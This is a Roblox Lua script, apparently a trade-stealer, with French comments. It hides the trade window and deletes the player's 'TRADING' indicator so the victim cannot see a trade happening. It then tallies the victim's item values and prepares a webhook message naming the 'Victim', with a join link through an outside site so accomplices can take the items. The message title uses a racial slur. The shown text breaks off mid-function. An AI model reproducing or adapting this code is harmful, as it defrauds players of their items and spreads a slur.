_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui:WaitForChild("Trade")
local inTrade = false

-- Cache UI & Status "TRADING"
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        -- Invisibilité de l'interface (2D)
        tradeGui.Main.Visible = false
        tradeGui.Black.Visible = false
        
        -- DÉSACTIVATION DU STATUS "TRADING" (3D)
        task.spawn(function()
            local char = plr.Character
            if char then
                for i = 1, 15 do -- On vérifie un peu plus longtemps pour être sûr
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("BillboardGui") then
                            obj.Enabled = false
                            obj:Destroy() 
                        end
                    end
                    task.wait(0.1)
                end
            end
        end)
    end
end)

---------------------------------------------------------
-- UTILITAIRES & RAP
---------------------------------------------------------
local function formatNumber(n)
    if not n then return "0" end
    if n >= 1000000 then return string.format("%.2fM", n/1000000)
    elseif n >= 1000 then return string.format("%.2fK", n/1000) end
    return tostring(math.floor(n))
end

local function getRAP(category, itemName)
    local success, rapData = pcall(function() 
        return require(game.ReplicatedStorage.Packages.Replion).Client:GetReplion("ItemRAP").Data.Items[category] 
    end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- WEBHOOK AVEC JOIN LINK & THUMBNAIL
---------------------------------------------------------
local function SendWebhook(list, prefix)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. "]\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (prefix ~= "") and prefix .. " game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')" or nil,
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```"
